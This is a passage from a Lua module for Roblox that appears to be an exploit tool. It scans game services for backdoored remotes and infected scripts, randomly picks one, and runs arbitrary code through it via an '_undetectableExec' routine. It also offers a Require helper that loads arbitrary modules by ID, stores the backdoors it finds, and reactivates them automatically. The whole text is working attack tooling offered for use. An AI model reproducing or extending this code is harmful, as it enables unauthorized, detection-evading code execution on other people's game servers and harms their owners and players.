            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
    end)
end

local function _startGameMonitoring()
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    
    _bs._currentGameId = tostring(game.GameId)
    _log("Game monitoring started. GameId: " .. _bs._currentGameId, "MONITOR")
    
    local rs = game:GetService("RunService")
    local lastGameCheck = tick()
    
    _bs._gameMonitor = rs.Heartbeat:Connect(function()
        if tick() - lastGameCheck < 1 then return end
        lastGameCheck = tick()
        
        local currentGameId = tostring(game.GameId)
        if currentGameId ~= _bs._currentGameId then
            _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:GameChanged")
            _bs.Disconnect()
            return
        end
    end)
    
    pcall(function()
        game:BindToClose(function()
            _log("GAME_CLOSING", "LEAVE")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:GameClosed")
            _bs.Disconnect()
        end)
    end)
    
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    
    if localPlayer then
        localPlayer.Destroying:Connect(function()
            _log("PLAYER_DESTROYING", "LEAVE")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:PlayerDestroyed")
            _bs.Disconnect()
        end)
        
        local lastParent = localPlayer.Parent
        localPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
            if localPlayer.Parent == nil and lastParent ~= nil then
                _log("PLAYER_PARENT_NIL", "LEAVE")
                _updateGUIStatus(false)
                _storage.selectedPath = nil
                print("PANS_PLAYER_LEFT:ParentNil")
                _bs.Disconnect()
            end
            lastParent = localPlayer.Parent
        end)
    end
end

local function _stopMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    _bs._currentGameId = nil
end

function _bs.Execute(code)
    if _bs._a and _bs._selected then
        _log("Executing through active backdoor...", "EXEC")
        return _undetectableExec(code)
    end
    
    if _storage.selectedPath then
        _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
        
        local restored = _findBackdoorByPath(_storage.selectedPath)
        if restored then
            _bs._selected = restored
            _bs._a = true
            
            _startMonitoring()
            _updateGUIStatus(true)
            
            _log("Reactivated successfully!", "REACTIVATE")
            return _undetectableExec(code)
        else
            _log("Stored backdoor no longer exists", "REACTIVATE")
            _storage.selectedPath = nil
        end
    end
    
    if _cfg.autoReconnect then
        _log("Attempting quick scan for reactivation...", "REACTIVATE")
        
        local found = _quickScan()
        if found and _bs._selected then
            _bs._a = true
            _startMonitoring()
            _updateGUIStatus(true)
            _log("Quick reactivation successful!", "REACTIVATE")
            return _undetectableExec(code)
        end
    end
    
    _log("Backdoor not active and reactivation failed", "ERROR")
    return false
end

function _bs.Scan()
    _log("Starting scan...", "SCAN")
    _bs._r = {}
    _bs._n = {}
    _bs._f = {}
    _bs._m = {}
    _bs._selected = nil
    _bs._selectedType = nil
    _bs._backup = {}
    _bs._s = tick()
    
    local services = {}
    local serviceNames = {"ReplicatedStorage", "ReplicatedFirst", "StarterGui", "StarterPack", "StarterPlayer", "Workspace"}
    
    for _, name in ipairs(serviceNames) do
        local ok, svc = pcall(function() return game:GetService(name) end)
        if ok and svc then
            table.insert(services, svc)
        end
    end
    
    local allR = {}
    local allS = {}
    local allM = {}
    local allF = {}
    
    for _, svc in ipairs(services) do
        local ar, as, am, af = _scan(svc)
        for _, v in ipairs(ar) do table.insert(allR, v) end
        for _, v in ipairs(as) do table.insert(allS, v) end
        for _, v in ipairs(am) do table.insert(allM, v) end
        for _, v in ipairs(af) do table.insert(allF, v) end
    end
    
    _log(("Found %d remotes, %d functions, %d scripts"):format(#allR, #allF, #allS), "SCAN")
    
    for _, r in ipairs(allR) do
        if r.Category == "NORMAL" then
            table.insert(_bs._n, r)
        else
            local isV, method, conf = _test(r, 0)
            if isV then
                r.Vulnerable = true
                r.ExecutionMethod = method
                r.Confidence = conf
                table.insert(_bs._r, r)
            else
                table.insert(_bs._n, r)
            end
        end
    end
    
    for _, f in ipairs(allF) do
        local isV, method, conf = _test(f, 0)
        if isV then
            f.Vulnerable = true
            f.ExecutionMethod = method
            f.Confidence = conf + 20
            table.insert(_bs._f, f)
        end
    end
    
    for _, s in ipairs(allS) do
        if s.IsBackdoor then
            local id = ""
            pcall(function() id = s.Object:GetDebugId() end)
            
            table.insert(_bs._r, {
                Object = s.Object,
                Name = s.Name,
                Type = "ScriptBackdoor",
                Path = s.Path,
                Category = "INFECTED_SCRIPT",
                Vulnerable = true,
                ExecutionMethod = s.ExecutionMethod or "script_source",
                Confidence = s.RiskScore,
                ScriptInfo = s,
                InstanceId = id
            })
        end
    end
    
    local allMalicious = {}
    
    for _, f in ipairs(_bs._f) do
        table.insert(allMalicious, f)
    end
    
    for _, s in ipairs(_bs._r) do
        if s.Category == "INFECTED_SCRIPT" then
            s.ScriptBackdoor = true
            table.insert(allMalicious, s)
        end
    end
    
    for _, r in ipairs(_bs._r) do
        if r.Category ~= "INFECTED_SCRIPT" then
            table.insert(allMalicious, r)
        end
    end
    
    -- [FIXED] Store in persistent storage
    _storage.detectedBackdoors = {}
    for _, m in ipairs(allMalicious) do
        table.insert(_storage.detectedBackdoors, {
            Path = m.Path,
            Name = m.Name,
            Type = m.Type,
            Category = m.Category,
            ExecutionMethod = m.ExecutionMethod,
            Confidence = m.Confidence
        })
    end
    
    if #allMalicious > 0 then
        local selected, backup = _selectRandomBackdoor(allMalicious)
        _bs._selected = selected
        _bs._backup = backup
        
        if selected.Category == "BACKDOORED_FUNC" then
            _bs._selectedType = "function"
            _log(("Selected BACKDOORED FUNCTION: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
        elseif selected.Category == "INFECTED_SCRIPT" or selected.ScriptBackdoor then
            _bs._selectedType = "script"
            _log(("Selected INFECTED SCRIPT: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
        else
            _bs._selectedType = "remote"
            _log(("Selected REMOTE: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
        end
    end
    
    for _, m in ipairs(allM) do
        table.insert(_bs._m, m)
    end
    
    return _bs._selected ~= nil, #_bs._n
end

function _bs.Require(mid)
    if type(mid) == "number" then mid = tostring(mid) end
    
    local requireCode = ([[
        local s,r=pcall(function()local m=require(%s)return m end)
        if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
    ]]):format(mid)
    
    return _bs.Execute(requireCode)
end

function _bs.Initialize(cb, cfg)
    _bs._cb = cb
    if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
    
    if _storage.selectedPath then
        _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
    end
    
    _log("Initialized v5.1 (Persistent Storage)", "INIT")
    return _bs
end

function _bs.Activate()
    if _bs._selected then
        _bs._a = true
        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s:%s"):format(
            _bs._selected.Path, 
            _bs._selected.Type, 
            _bs._selectedType or "unknown"
        ))
        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s:%s"):format(
            _bs._selected.Path, 
            _bs._selected.Type, 
            _bs._selected.ExecutionMethod or "direct",
            _bs._selectedType or "unknown"
        ))
        
        _createGUI()
        
        _startMonitoring()
        _startGameMonitoring()
        
        _log("Active, monitored, and GUI created", "ACTIVE")
        return true
    end
    _log("No backdoor selected", "ERROR")
    return false
end

function _bs.Disconnect()
    _stopMonitoring()
    _bs._a = false
    
    _updateGUIStatus(false)
    
    local oldPath = "unknown"
    local oldType = _bs._selectedType
    if _bs._selected then
        oldPath = _bs._selected.Path
    end
    
    _bs._selected = nil
    _bs._selectedType = nil
    
    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath .. ":" .. (oldType or "unknown"))
    _log("Disconnected: " .. oldPath .. " (Type: " .. (oldType or "unknown") .. ")", "DISCONNECT")
end

-- [MANAGER SUPPORT] Get all detected backdoors from storage
function _bs.GetAllDetected()
    local all = {}
    
    -- Use persistent storage if available
    if _storage.detectedBackdoors and #_storage.detectedBackdoors > 0 then
        for _, bd in ipairs(_storage.detectedBackdoors) do
            table.insert(all, {
                Path = bd.Path,
                Type = bd.Type,
                ExecutionMethod = bd.ExecutionMethod,
                Confidence = bd.Confidence,
                Category = bd.Category
            })
        end
        return all
    end
    
    -- Fallback to current session
    for _, f in ipairs(_bs._f) do
        table.insert(all, {
            Path = f.Path,
            Type = f.Type,
            ExecutionMethod = f.ExecutionMethod,
            Confidence = f.Confidence,
            Category = f.Category
        })
    end
    
    for _, s in ipairs(_bs._r) do
        if s.Category == "INFECTED_SCRIPT" then
            table.insert(all, {
                Path = s.Path,
                Type = s.Type,
                ExecutionMethod = s.ExecutionMethod,
                Confidence = s.Confidence,
                Category = "INFECTED_SCRIPT"
            })
        end
    end
    
    for _, r in ipairs(_bs._r) do
        if r.Category ~= "INFECTED_SCRIPT" then
            table.insert(all, {
                Path = r.Path,
                Type = r.Type,
                ExecutionMethod = r.ExecutionMethod,
                Confidence = r.Confidence,
                Category = r.Category
            })
        end
    end
    
    return all
end

-- [MANAGER SUPPORT] Activate specific backdoor - FIXED
function _bs.ActivateSpecific(path, category)
    _log("Attempting to activate: " .. path .. " [" .. category .. "]", "MANAGER")
    
    -- First check persistent storage
    if _storage.detectedBackdoors then
        for _, bd in ipairs(_storage.detectedBackdoors) do
            if bd.Path == path then
                -- Found in storage, now find the actual object in game
                local obj = nil
                local segments = {}
                for segment in string.gmatch(path, "[^%.]+") do
                    table.insert(segments, segment)
                end
                
                local current = game
                for i, segment in ipairs(segments) do
                    if segment == "game" then
                        current = game
                    else
                        local found = nil
                        local children = {}
                        pcall(function() children = current:GetChildren() end)
                        
                        for _, child in ipairs(children) do
                            if child.Name == segment then
                                found = child
                                break
                            end
                        end
                        
                        if not found then
                            local ok, svc = pcall(function() return game:GetService(segment) end)
                            if ok and svc then
                                found = svc
                            end
                        end
                        
                        if found then
                            current = found
                        else
                            _log("Could not find segment: " .. segment, "ERROR")
                            return false
                        end
                    end
                end
                
                -- Verify it's valid
                local isValid = pcall(function()
                    return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
                end)
                
                if isValid then
                    _bs._selected = {
                        Object = current,
                        Name = current.Name,
                        Type = current.ClassName,
                        Path = path,
                        Category = bd.Category,
                        ExecutionMethod = bd.ExecutionMethod,
                        Confidence = bd.Confidence
                    }
                    
                    -- Determine type from category
                    if bd.Category == "BACKDOORED_FUNC" then
                        _bs._selectedType = "function"
                    elseif bd.Category == "INFECTED_SCRIPT" then
                        _bs._selectedType = "script"
                    else
                        _bs._selectedType = "remote"
                    end
                    
                    _bs._a = true
                    
                    _storage.selectedPath = path
                    _storage.selectedType = _bs._selectedType
                    
                    _startMonitoring()
                    _startGameMonitoring()
                    _createGUI()
                    
                    _log("Successfully activated: " .. path, "MANAGER")
                    return true
                else
                    _log("Found object is not a valid remote", "ERROR")
                    return false
                end
            end
        end
    end
    
    _log("Backdoor not found in storage: " .. path, "ERROR")
    return false
end

function _bs.GetStatus()
    return {
        Active = _bs._a,
        HasSelection = _bs._selected ~= nil,
        SelectedPath = _bs._selected and _bs._selected.Path or nil,
        SelectedType = _bs._selectedType,
        StoredPath = _storage.selectedPath,
        BackupCount = #_bs._backup,
        NormalRemotes = #_bs._n,
        BackdooredFunctions = #_bs._f,
        ScanTime = tick() - _bs._s,
        CurrentGameId = _bs._currentGameId,
        HasGUI = _bs._gui ~= nil,
        StorageCount = _storage.detectedBackdoors and #_storage.detectedBackdoors or 0
    }
end

function _bs.GetSelected()
    return _bs._selected
end

function _bs.GetBackups()
    return _bs._backup
end

function _bs.ToggleGUI()
    if _bs._gui then
        _bs._gui.Enabled = not _bs._gui.Enabled
        return _bs._gui.Enabled
    else
        _createGUI()
        return true
    end
end

function _bs.DestroyGUI()
    if _bs._gui then
        pcall(function() _bs._gui:Destroy() end)
        _bs._gui = nil
        _bs._guiStatusDot = nil
        _bs._guiStatusText = nil
        _bs._guiConsole = nil
        _log("GUI Destroyed", "GUI")
    end
end

return _bs
